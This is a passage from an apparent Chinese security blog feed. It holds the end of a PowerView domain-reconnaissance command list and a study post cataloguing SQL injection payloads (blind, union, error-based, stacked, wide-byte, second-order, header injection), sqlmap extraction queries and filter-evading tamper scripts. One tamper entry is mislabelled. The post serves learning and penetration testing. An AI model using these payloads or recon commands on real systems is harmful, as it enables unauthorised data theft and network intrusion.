<ul>
<li><p>绕过禁止执行脚本策略</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj66h2zlj30my0c2tbs.jpg" alt="image-20200217163648923"></p>
</li>
</ul>
</li>
<li><p>Import-Module .\PowerView.ps1</p>
<ul>
<li>导入脚本</li>
</ul>
</li>
</ul>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj68rhtpj30n001m74q.jpg" alt="image-20200217163257583"></p>
<h3 id="0x01-PowerShell收集信息"><a href="#0x01-PowerShell收集信息" class="headerlink" title="0x01 PowerShell收集信息"></a>0x01 PowerShell收集信息</h3><h4 id="PowerView常用命令"><a href="#PowerView常用命令" class="headerlink" title="PowerView常用命令"></a>PowerView常用命令</h4><p>Get-NetDomain:获取当前用户所在的域名称</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj64ds1xj30h807i75d.jpg" alt="image-20200217163900114"></p>
<p>Get-NetUser:返回所有用户的详细信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6bziwdj30u01ah7j7.jpg" alt="image-20200217163942936"></p>
<p>Get-NetDomainController:获取所有域控制器</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6cnzq7j30ya0b4acp.jpg" alt="image-20200217164034756"></p>
<p>Get-NetComputer:获取所有域内机器的详细信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj651tghj30i4038jrx.jpg" alt="image-20200217164133046"></p>
<p>Get-NetOU:获取域中的 OU 信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6czrqtj30g401aaaf.jpg" alt="image-20200217164222548"></p>
<p>Get-NetGroup:获取所有域内组和组成员信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj66y365j30iy0q6q7g.jpg" alt="image-20200217164242191"></p>
<p>Get-NetFileServer:根据 SPN 获取当前域使用的文件服务器</p>
<p>Get-NetShare:获取当前域内所有网络共享</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj65iq4tj30qe04wt9j.jpg" alt="image-20200217164306539"></p>
<p>Get-NetSession:获取在指定服务器存在的会话信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj65znhsj30xu040aau.jpg" alt="image-20200217164324626"></p>
<p>Get-NetRDPSession:获取在指定服务器存在的远程连接信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj68ae40j30k609ydgy.jpg" alt="image-20200217164400230"></p>
<p>Get-NetProcess:获取远程主机的进程信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6dhomcj30s20lotba.jpg" alt="image-20200217164434944"></p>
<p>Get-UserEvent:获取指定用户的日志信息</p>
<p>Get-ADObject:获取活动目录的对象信息</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj69blskj30xm0psqaf.jpg" alt="image-20200217164654526"></p>
<p>Get-NetGPO:获取域所有组策略对象</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj69xlvfj30y00r412k.jpg" alt="image-20200217164717550"></p>
<p>Get-DomainPolicy:获取域默认或域控制器策略</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6efcsqj30xe07mq5j.jpg" alt="image-20200217164733846"></p>
<p>Invoke-UserHunter:用于获取域用户登录计算机及该用户是否有本地管理权限</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6exa1rj30iy09yq49.jpg" alt="image-20200217164904418"></p>
<p>Invoke-ProcessHunter:查找域内所有机器进程用于找到某特定用户</p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6ao0kqj30o60kqgop.jpg" alt="image-20200217164937196"></p>
<p>Invoke-UserEventHunter:根据用户日志获取某域用户登录过哪些域机器</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>域内信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>数据库注入语句收集及学习</title>
    <url>/2020/06/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E6%94%B6%E9%9B%86%E5%8F%8A%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1gfefq6pib1j31c00u01kx.jpg" alt="27"></p>
<a id="more"></a>

<h3 id="0x00-任务介绍"><a href="#0x00-任务介绍" class="headerlink" title="0x00 任务介绍"></a>0x00 任务介绍</h3><p>1、收集网络上各种 sql 注入时使用的 payload 并理解其适用的环境（检测注入、利用注入）</p>
<p>2、记录 sqlmap 的检测和利用过程中使用的 payload（也算一种 payload 收集方式）</p>
<p>3、理解以上涉及的 sql 语句的意思，其中会涉及不同的数据库、不同注入场景，可以将学习的过程和收集的方式进行整理形成报告，关于 payload 的理解，其中会涉及之前学习的基础。</p>
<p>扩展学习：理解 sqlmap 自带 tamper 的原理，这里通常包含很多数据库的特性，从而实现 payload 变形啥的，用来绕过一些简单的安全检测</p>
<h3 id="0x01-收集注入语句"><a href="#0x01-收集注入语句" class="headerlink" title="0x01 收集注入语句"></a>0x01 收集注入语句</h3><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>1、布尔注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">	通过页面是否返回正常判定是否存在注入</span><br><span class="line">原理</span><br><span class="line">	以真假判断是否存在，真为正常，假为不正常(页面区别不大，需仔细辨别不同点来判断是否存在注入)</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">  存在注入点，判断第一个数据库第一个字符是否等于c</span><br><span class="line">  	and substr(database(),3,1)&#x3D;&#39;c&#39;</span><br><span class="line">  判断数据库的第一张表的第一个字符是否等于a</span><br><span class="line">  	and (ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1,1)))&gt;97#</span><br><span class="line">  列名及数据同上，此处可使用burp遍历</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6vvwe9j31ii0hqdie.jpg" alt="image-20200213013652627"></p>
<p>2、延时注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">		根据注入函数sleep来判断，若注入条件成立，则延长网页返回时间。</span><br><span class="line"></span><br><span class="line">原理</span><br><span class="line">		使用判断语句判断条件是否正确。if(exp1,exp2,exp3),若第一个条件成立，则执行第二条，反之第三条</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">  数据库名如果等于8个字符，网页延时10秒</span><br><span class="line">  	and if(length(database())&#x3D;8,sleep(10),1)</span><br><span class="line">  数据库的第一个字符如果等于a，页面延时10秒</span><br><span class="line">  	and if(substr(database(),1,1)&#x3D;&#39;a&#39;,sleep(10),1)</span><br><span class="line">  数据库第一张表的第一个字符如果等于a，页面延时10秒</span><br><span class="line"> 	 and if(substr((select table_name from information_schema.tables where table_schema&#x3D;&#39;数据库名&#39; limit 0,1),1,1)&#x3D;&#39;a&#39;,sleep(10),1)--+</span><br><span class="line">  列名及数据同上，此处可使用burp遍历</span><br></pre></td></tr></table></figure>



<h4 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用场景</span><br><span class="line">	页面必须有显示位，客户端将数据展示在页面中，展示数据的位置就叫显示位</span><br><span class="line">流程</span><br><span class="line">  判断是否存在注入点</span><br><span class="line">  判断字段 order by n</span><br><span class="line">  union select 1,2,...,n</span><br><span class="line">  显示报错位</span><br><span class="line">  在报错位置写入注入语句</span><br></pre></td></tr></table></figure>

<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>利用场景：</p>
<p>​    页面无显示位，但是有sql注入语句执行错误信息显示。</p>
<p>1、floor报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">	报错基于count,rand,group by三者，floor(rand(0)*2))报错条件记录必须大于3条以上,</span><br><span class="line">	floor(rand(0)*2))，随机数*2后向下取整</span><br><span class="line">	count(*), group by，创建一张虚拟表来统计所有数据，虚拟表中有唯一主键值，floor(rand(0)*2))让主键值重复，并抛出主键异常报错</span><br><span class="line"></span><br><span class="line">查询数据库版本</span><br><span class="line">and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</span><br><span class="line">	 </span><br><span class="line">查询数据库</span><br><span class="line">and (select 1 from(select+count(*),concat(floor(rand(0)*2),database())a from information_schema.tables group by a)b)%23</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6utkrhj31c60dg76k.jpg" alt="image-20200213003231964"></p>
<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6x5owqj31c00ds0uu.jpg" alt="image-20200213003529570"></p>
<p>2、updatexml报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">		updatexml的第二个参数需要xpath格式字符串，0x7e不是xpath格式语句，所以会将中间执行结果以错误形式报出。</span><br><span class="line">		</span><br><span class="line">查询数据库版本信息</span><br><span class="line">		and updatexml(1,concat(0x7e,@@version,0x7e),1)</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6wqv8wj318u02m0tm.jpg" alt="image-20200213010305239"></p>
<p>3、ExtractValue报错注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理同updatexml一样</span><br><span class="line">	updatexml的第二个参数需要xpath格式字符串，0x7e不是xpath格式语句，所以会将中间执行结果以错误形式报出。</span><br><span class="line">	</span><br><span class="line">查询数据库版本信息</span><br><span class="line">		and extractvalue(1,concat(0x7e,@@version,0x7e))</span><br></pre></td></tr></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/0082zybpgy1gbzj6v92fuj317k02smy1.jpg" alt="image-20200213011351107"></p>
<h4 id="堆查询注入"><a href="#堆查询注入" class="headerlink" title="堆查询注入"></a>堆查询注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景 </span><br><span class="line">	可用于执行多条sql语句，以;分割，堆注入通过第二条语句来执行自己需要构造的语句。</span><br><span class="line">原理</span><br><span class="line">	堆叠注入可同时使用多条语句，使用;分割，判断存在注入，则可使用堆叠注入构造要执行的语句。</span><br><span class="line">	可结合时间盲注、布尔盲注</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">	判断第一个数据库的长度大于10，页面延时4秒</span><br><span class="line">		;select if(length(database())&gt;10,sleep(4),1)</span><br><span class="line">	判断第一个数据库，第一个字符是否等于s，如果存在页面延时4秒</span><br><span class="line">		;select if(substr(database(),1,1)&#x3D;&#39;s&#39;,sleep(4),1)</span><br></pre></td></tr></table></figure>



<h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">	mysql数据库字符编码为gbk时，会认为两个字符为一个汉字。</span><br><span class="line">原理</span><br><span class="line">	宽字节注入发生在数据库编码为gbk的情况下，需要绕过\，代码使用\’过滤单引号情况下</span><br><span class="line">	\编码是%5c，%df%5c可以组成一个中文字符“連”，使用%df可以将%5c吃掉组成一个中文字符，则可以成功绕过\</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">	判断存在注入并且被转义，此时数据库是gkb编码，id&#x3D;&#39;1%df%5c&#39; union select 1,...,n#&#39;</span><br><span class="line">	可以绕过转义进行注入</span><br></pre></td></tr></table></figure>



<h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">利用场景</span><br><span class="line">	开发者对插入数据库恶意语句进行转义，但在恶意数据插入数据库时被处理的数据又被还原并存储在数据库中。</span><br><span class="line">原理</span><br><span class="line">	根据写入数据库的特殊数据结合数据库正常语句执行后形成的二次注入，代码中转义或过滤了敏感字符，但写入</span><br><span class="line">	数据库未过滤敏感字符，将用户写入的数据完整的存入数据库而导致的二次注入</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">  创建一个特殊流程，test&#39;--,数据库语句：</span><br><span class="line">  	insert into test(user,password) values(&#39;test&#39;&#39;,&#39;1234&#39;);</span><br><span class="line">  此时存在一个正常用户，test,修改密码，此时数据库语句如下</span><br><span class="line">  	update users set pawweord&#x3D;&#39;yes&#39; user&#x3D;&#39;test&#39;--&#39; and old_pass&#x3D;&#39;1234&#39;</span><br><span class="line">  等于&#39;--注释掉后面的所有语句，执行了此条语句</span><br><span class="line"> 		update users set pawweord&#x3D;&#39;yes&#39; user&#x3D;&#39;test&#39;</span><br><span class="line">  用户从test&#39;--变成了test，修改了正常用户test的密码。</span><br></pre></td></tr></table></figure>



<h4 id="xff-x-forwarded-for-注入"><a href="#xff-x-forwarded-for-注入" class="headerlink" title="xff(x-forwarded-for)注入"></a>xff(x-forwarded-for)注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">	使用burp重放模块修改x-forwarded-for值，可用于伪造ip</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">	x-forwarded-for:127.0.0.1&#39; and 1&#x3D;1# 判断是否存在注入，存在返回正常，不存在返回报错</span><br></pre></td></tr></table></figure>



<h4 id="偏移注入"><a href="#偏移注入" class="headerlink" title="偏移注入"></a>偏移注入</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原理</span><br><span class="line">	已知user表存在8个字段，判断存在admin表，但不知道有几个字段，可通过偏移注入查询</span><br><span class="line"></span><br><span class="line">测试流程</span><br><span class="line">		union select 1,2,3,4,5,6,7,8 from user   user表</span><br><span class="line">	查询admin表,使用admin.*来偏移，判断admin表存在几个字段</span><br><span class="line">		union select 1,2,3,4,5,6,7,admin.* from user</span><br><span class="line">		union select 1,2,3,4,5,admin.* from user 返回正常，则admin表存在3个字段</span><br><span class="line">	偏移注入试用于access数据库</span><br></pre></td></tr></table></figure>



<h3 id="0x02-SqlMap-Payload收集"><a href="#0x02-SqlMap-Payload收集" class="headerlink" title="0x02 SqlMap Payload收集"></a>0x02 SqlMap Payload收集</h3><p>sqlmap支持五种不同的注入模式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 </span><br><span class="line"></span><br><span class="line">2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页 面返回时间是否增加）来判断。 </span><br><span class="line"></span><br><span class="line">3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 </span><br><span class="line"></span><br><span class="line">4、联合查询注入，可以使用union的情况下的注入。 </span><br><span class="line"></span><br><span class="line">5、堆查询注入，可以同时执行多条语句的执行时的注入。</span><br></pre></td></tr></table></figure>

<p>sqlmap支持的数据库有：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MySQL</span><br><span class="line">Oracle</span><br><span class="line">PostgreSQL</span><br><span class="line">Microsoft SQL Server</span><br><span class="line">Microsoft Access</span><br><span class="line">IBM DB2</span><br><span class="line">SQLite</span><br><span class="line">Firebird</span><br><span class="line">Sybase</span><br><span class="line">SAP MaxDB</span><br></pre></td></tr></table></figure>

<p>sqlmap对一个点是进行了怎样的尝试判断以及读取数据，可以使用-v参数。共有七个等级，默认为1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0、只显示python错误以及严重的信息。 </span><br><span class="line"></span><br><span class="line">1、同时显示基本信息和警告信息。（默认） </span><br><span class="line"></span><br><span class="line">2、同时显示debug信息。 </span><br><span class="line"></span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line"></span><br><span class="line">4、同时显示HTTP请求。 </span><br><span class="line"></span><br><span class="line">5、同时显示HTTP响应头。 </span><br><span class="line"></span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure>



<p>函数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ORD(string) ：返回字符串首字符的ASCII码值。</span><br><span class="line"></span><br><span class="line">MID(string，start，length) ：返回字符串的从start开始长度为length的字符串。</span><br><span class="line"></span><br><span class="line">IFNULL(string1，string2) ：如果string1是NULL则返回string2，如果不是NULL返回string1。</span><br><span class="line"></span><br><span class="line">CAST(volume as type) 用于数据类型转换，将volume转换成type类型的数据（如这里是将数字转换为字符串）。</span><br><span class="line"></span><br><span class="line">COUNT()： 统计个数。</span><br><span class="line"></span><br><span class="line">DISTINCT()： 标记只要不同（唯一）的值。</span><br><span class="line"></span><br><span class="line">INFORMATION_SCHEMA是mysql自带的一个访问元数据的数据库，也就是数据库信息，里面有很多表，在这里使用了SCHEMATA表这个表储存的是所有数据库的信息。</span><br></pre></td></tr></table></figure>

<p>获取数据库名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECTDISTINCT(IFNULL(CAST(schema_name AS CHAR),0x20))FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 0,1),1,1)) &gt;64</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LIMIT 0,1意思是取出第一个数据库。 LIMIT的意思是限定到的条目的位置以及数量，第一个参数是代表偏移量（从0开始，0即代表不偏移从第一个 开始），第二个参数代表返回的数量。</span><br></pre></td></tr></table></figure>

<p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(table_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema&#x3D;0x64767761 LIMIT 0,1),1,1))&gt;64</span><br></pre></td></tr></table></figure>

<p>获取所有字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(COUNT(column_name) AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;0x7573657273 AND table_schema&#x3D;0x64767761),1,1))&gt;51</span><br></pre></td></tr></table></figure>

<p>获取第一个字段名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(column_name AS CHAR),0x20) FROM INFORMATION_SCHEMA.COLUMNS WHERE table_name&#x3D;0x7573657273 AND table_schema&#x3D;0x64767761 LIMIT 0,1),1,1))&gt;64</span><br></pre></td></tr></table></figure>

<p>获取字段中数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4 AND ORD(MID((SELECT IFNULL(CAST(&#96;user&#96; AS CHAR),0x20) FROM dvwa.users ORDER BY &#96;user&#96; LIMIT 0,1),1,1))&gt;64</span><br></pre></td></tr></table></figure>



<h3 id="0x03-常用的tamper脚本"><a href="#0x03-常用的tamper脚本" class="headerlink" title="0x03 常用的tamper脚本"></a>0x03 常用的tamper脚本</h3><ol>
<li>apostrophemask.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将引号替换为utf-8，用于过滤单引号</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1 AND &#39;1&#39;&#x3D;&#39;1&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND %EF%BC%871%EF%BC%87&#x3D;%EF%BC%871</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>base64encode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：替换为base64编码</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</span><br><span class="line"></span><br><span class="line">使用脚本后：MScgQU5EIFNMRUVQKDUpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>multiplespaces.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：围绕sql关键字添加多个空格</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 UNION SELECT foobar&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 UNION SELECT foobar</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>space2plus.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：用加号替换空格</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT+id+FROM+users</span><br></pre></td></tr></table></figure>

<ol start="5">
<li>nonrecursivereplacement.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将</span><br><span class="line"></span><br><span class="line">select替换为空）</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 UNION SELECT 2--&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 UNIOUNIONN SELESELECTCT 2--</span><br></pre></td></tr></table></figure>

<ol start="6">
<li>space2randomblank.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将空格替换为其他有效字符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%0Did%0DFROM%0Ausers</span><br></pre></td></tr></table></figure>

<ol start="7">
<li>unionalltounion.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将union allselect 替换为unionselect</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;-1 UNION ALL SELECT&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：-1 UNION SELECT</span><br></pre></td></tr></table></figure>

<ol start="8">
<li>securesphere.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：追加特定的字符串</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 1&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND 1&#x3D;1 and &#39;0having&#39;&#x3D;&#39;0having&#39;</span><br></pre></td></tr></table></figure>

<ol start="9">
<li>space2dash.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ALL</span><br><span class="line"></span><br><span class="line">作用：将空格替换为--，并添加一个随机字符串和换行符</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227&#x3D;9227</span><br></pre></td></tr></table></figure>

<ol start="10">
<li>space2mssqlblank.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：Microsoft SQL Server</span><br><span class="line"></span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005</span><br><span class="line"></span><br><span class="line">作用：将空格随机替换为其他空格符号(&#39;%01&#39;, &#39;%02&#39;, &#39;%03&#39;, &#39;%04&#39;, &#39;%05&#39;, &#39;%06&#39;, &#39;%07&#39;,</span><br><span class="line"></span><br><span class="line"> &#39;%08&#39;, &#39;%09&#39;, &#39;%0B&#39;, &#39;%0C&#39;, &#39;%0D&#39;, &#39;%0E&#39;, &#39;%0F&#39;, &#39;%0A&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT%0Eid%0DFROM%07users</span><br></pre></td></tr></table></figure>

<ol start="11">
<li>percentage.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ASP</span><br><span class="line"></span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL</span><br><span class="line"></span><br><span class="line">9.0</span><br><span class="line"></span><br><span class="line">作用：在每个字符前添加一个%</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD FROM TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</span><br></pre></td></tr></table></figure>

<ol start="12">
<li>sp_password.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：MSSQL</span><br><span class="line"></span><br><span class="line">作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND 9227&#x3D;9227-- &#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND 9227&#x3D;9227-- sp_password</span><br></pre></td></tr></table></figure>

<ol start="13">
<li>charencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、 </span><br><span class="line"></span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</span><br></pre></td></tr></table></figure>

<ol start="14">
<li>randomcase.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、 </span><br><span class="line"></span><br><span class="line">PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：随机大小写</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;INSERT&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：INseRt</span><br></pre></td></tr></table></figure>

<ol start="15">
<li>charunicodeencode.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">适用数据库：ASP、ASP.NET</span><br><span class="line"></span><br><span class="line">测试通过数据库：Microsoft SQL Server 2000&#x2F;2005、MySQL 5.1.56、PostgreSQL 9.0.3</span><br><span class="line"></span><br><span class="line">作用：适用字符串的unicode编码</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：</span><br><span class="line"></span><br><span class="line">%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</span><br></pre></td></tr></table></figure>

<ol start="16">
<li>space2comment.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：将空格替换为&#x2F;**&#x2F;</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT id FROM users&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT&#x2F;**&#x2F;id&#x2F;**&#x2F;FROM&#x2F;**&#x2F;users</span><br></pre></td></tr></table></figure>

<ol start="17">
<li>equaltolike.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5</span><br><span class="line"></span><br><span class="line">作用：将&#x3D;替换为LIKE</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;SELECT * FROM users WHERE id&#x3D;1&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：SELECT * FROM users WHERE id LIKE 1</span><br></pre></td></tr></table></figure>

<ol start="18">
<li>equaltolike.py</li>
</ol>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</span><br><span class="line"></span><br><span class="line">作用：将&gt;替换为GREATEST，绕过对&gt;的过滤</span><br><span class="line"></span><br><span class="line">使用脚本前：tamper(&#39;1 AND A &gt; B&#39;)</span><br><span class="line"></span><br><span class="line">使用脚本后：1 AND GREATEST(A,B+1)&#x3D;A</span><br></pre></td></tr></table></figure>

<ol start="19">
<li>ifnull2ifisnull.py</li>
</ol>
